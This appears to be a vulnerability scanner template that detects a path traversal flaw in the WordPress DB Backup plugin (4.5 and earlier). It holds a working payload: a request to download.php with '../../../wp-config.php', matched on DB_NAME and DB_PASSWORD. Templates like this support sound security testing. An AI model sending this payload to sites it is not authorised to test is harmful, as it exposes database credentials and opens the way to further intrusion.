id: db-backup-lfi
info:
  author: dhiyaneshDK
  description: WordPress Plugin DB Backup is prone to a directory traversal vulnerability
    because it fails to sufficiently sanitize user-supplied input. Exploiting this
    issue can allow an attacker to obtain sensitive information that could aid in
    further attacks. WordPress Plugin DB Backup version 4.5 is vulnerable; prior versions
    may also be affected.
  name: DB Backup <= 4.5 - Path Traversal File Access
  reference:
  - https://wpscan.com/vulnerability/d3f1e51e-5f44-4a15-97bc-5eefc3e77536
  - https://www.exploit-db.com/exploits/35378
  severity: high
  tags: wordpress,wp-plugin,lfi,wp
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php'
